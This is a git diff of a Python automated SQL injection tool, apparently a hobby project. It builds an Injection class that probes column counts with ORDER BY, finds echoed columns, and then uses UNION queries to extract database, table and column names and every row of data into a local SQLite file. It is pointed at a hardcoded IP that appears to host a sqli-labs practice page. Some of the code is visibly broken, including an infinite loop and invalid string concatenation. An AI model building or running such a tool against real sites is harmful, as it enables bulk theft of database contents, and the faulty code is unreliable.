@@ -2,24 +2,33 @@
 # nsfoxer
 # time: 2020年 06月 10日 星期三 17:02:23 CST 
 
-import get_info
+import sys
+from lib.core.function.get_info import *
+from lib.core.function.payload import *
+from lib.database.data_storage import *
+import random
 
 class Injection():
     '''
     不进行注入检测，假设为带回显的注入
     '''
-    database = Database()
+    database = None
     page_info = None
     url = ''
-    payload = ''
+    payload = None
+    _probe_num = 0 # 探测当前表名的列数
+    _serial_num = 0 # 探测第几号有信息回显
+    _magic_str = '' # 魔力字符串
+    _url_ready = '' # 预处理url
 
     def __init__(self, url):
-        self.database = Database()
+        self._magic_str = "$$$$$$$$$$$$$$$$$"
+        self.database = Data(F"{url}.sqlite")
         self.url = url
-        self.page_info = get_info.PageInfo(url)
-        self.payload = '' # .......................
+        self.page_info = PageInfo(url)
+        self.payload = Payload()
 
-    def __get_columns_num(self, url_ready, magic_str):
+    def _get_columns_num(self):
         '''
         得到当前列的所有列数
         '''
@@ -28,68 +37,141 @@ class Injection():
         probe_num = 0
         while low < high:
             probe_num = (low+high)/2
-            payload = self.payload.get_order_by(probe_num)
-            url_malformation = url_ready.replace(magic_str, payload)
-            count = self.page_info.init_malinfo_location(url_malformation, ['You have an error in your SQL syntax;'])
-            if count > 0:
+            payload = self.payload.order_by(probe_num)
+            url_malformation = self._url_ready.replace(self._magic_str, payload)
+            serial_num = self.page_info.init_malinfo_location(url_malformation, ['You have an error in your SQL syntax;'])
+            if serial_num > -1:
                 # 表示列存在
                 low = probe_num+1
             else: # 表示测试列超出范围
                 high = probe_num-1
-        return probe_num
+        self._probe_num = probe_num
 
 
-    def exec_payload(self, location, level):
+    def exec_payload(self, location, level, database='', table='', columns=[]):
         '''
-        执行
-        location == 注入点位置()
-        level: 所需要得到的数据详细程度
-                1. 库名
-                2. 表名
-                3. 列名
-                4. 库内容
+        执行,将得到的数据放入数据库
+        Args:
+            location : 注入点位置()
+            level: 所需要得到的数据详细程度
+                    1. 库名
+                    2. 表名
+                    3. 列名
+                    4. 库内容
+            databases: str, 表示要查找的库
+            table： str, 表示要查找的表
+            columns: list, 每一项为str，表示一个键值
+        Returns:
+            null
         '''
         # url 预处理
-        magic_str = '$$$$$$$$$$$'
-        url_ready = self.url.split('=')[:location] + magic_str + '&' + self.url.split('&')[1:]
+        self._url_ready = self.url.split('=')[:location] + self._magic_str + '&' + self.url.split('&')[1:]
         # 探测当前表名的列数
-        probe_num = self.__get_columns_num(url_ready, magic_str)
-        # 探测页面信息暴露点
-        payload = self.__get_
+        self._get_columns_num()
+        # 探测页面信息暴露点,序号
+        self._get_serial_num()
 
-        _level = 0
-        while _level < level:
-
-            # 
-            payload = self.payload.get_payload(database='', table='', column = '')
-            # 处理payload
-            payload = ''
-            # url 拼接
-            url_malformation = url_ready.replace(magic_str, payload)
-            #
-            self.page_info.get_malinfo_location(url_malformation, special_num_list)
+        if level > 0:
+            self._get_databases()
+        if level > 1:
+            self._get_tables(database)
+        if level > 2:
+            self._get_columns(database, [table])
+        if level > 3:
+            self._get_data(database, table, columns)
 
 
+    def _get_databases(self):
+        databases = self._analysis_data()
+        for db in databases:
+            self.database.add_database(db)
 
-def Database():
-    database = []
-    table= {}
+    def _get_tables(self, database=[]):
+        databases = []
+        if len(database) != 0:
+            databases = database
+        else:
+            databases = self.database.get_databases()
+        for db in databases:
+            tables = self._analysis_data(db)
+            for tb in tables:
+                self.database.add_tables(db, tb)
 
-    def __init__(self):
-        pass
+    def _get_columns(self, database='', table=[]):
+        '''
+        从页面中获得所有列名,并将数据存储
+        参数为空获得表示所有
+        Args:
+            databases: str,表示一个库名
+            table： 列表，每一项为str，表示表名
+        '''
+        if database != '' and len(table) != 0:
+            # 单独搜索
+            for tb in table:
+                columns = self._analysis_data(database, tb)
+                self.database.add_column(database, tb, columns)
+        else:
+            # 全部搜索
+            for db in self.database.get_databases():
+                for tb in self.database.get_tables(db):
+                    columns = self._analysis_data(db, tb)
+                    self.database.add_column(db, tb, columns)
 
-    def set_database(self, database):
-        self.database.append[database]
-        self.table.append
+    def _get_data(self, database='', table='', columns=[]):
+        '''
+        获得指定表列数据
+        参数任意一项为空表示获得所有数据
+        Args:
+            database: str 一个库名
+            table: str 一个表名
+            columns: list 每一项str,表示一个列
+        '''
+        if len(database) != 0 and len(table) != 0 and len(columns) != 0:
+            # 指定搜索
+            # 查找到所有数据，每一行以空格相隔, 每行数据以逗号相隔
+            data = self._analysis_data(database, table, columns, ' ')
+            for data_line in data:
+                self.database.add_data(database, table, columns, data_line.split(','))
+        else:
+            # 搜索所有库的所有表的所有列的所有数据
+            for db in self.database.get_databases():
+                for tb in self.database.get_tables(db):
+                    columns = self.database.get_columns(db, tb)
+                    data = self._analysis_data(db, tb, columns)
+                    for data_line in data:
+                        self.database.add_data(db, tb, columns, data_line.split(','))
 
-    def set_table(self, database, table);
-        pass
-    def set_column(self, database, table, column):
-        pass
-    def set_data(self, database, table, column, data):
-        pass
-    def get_database(self):
-        return self.database
-    def get_table(self, Database):
-        return k
+    def _analysis_data(self, database='', table='', columns=[], split_char=','):
+        '''
+        加载payload，并返回分析结果
+        Args:
+            databases: str,库名
+            table: str, 表名
+            columns: list, 所需列的数据
+        '''
+        payload = self.payload.union_sql(self._probe_num, self._serial_num, database, table, columns)
+        url_malformation = self._url_ready.replace(self._magic_str, str(payload))
+        result = self.page_info.get_info(url_malformation)
+        return result.split(split_char)
+
+    def _get_serial_num(self):
+        randnum_list = []
+        # 生成随机数字字符串
+        i = 0
+        while i < self._probe_num:
+            randnum_list.append(str(random.randint(100000, 1000000)))
+        # 根据随机字符获取payload
+        payload = self.payload.order_list(randnum_list)
+        url_malformation = self._url_ready.replace(self._magic_str, payload)
+        serial_num = self.page_info.init_malinfo_location(url_malformation, randnum_list)
+        if serial_num < 0:
+            print("未能探测成功")
+        self._serial_num = serial_num
+
+
+if __name__ == '__main__':
+    inject = Injection('http://47.95.4.158:8002/Less-1/?id=1')
+    inject.exec_payload(1, 1)
+
+
 
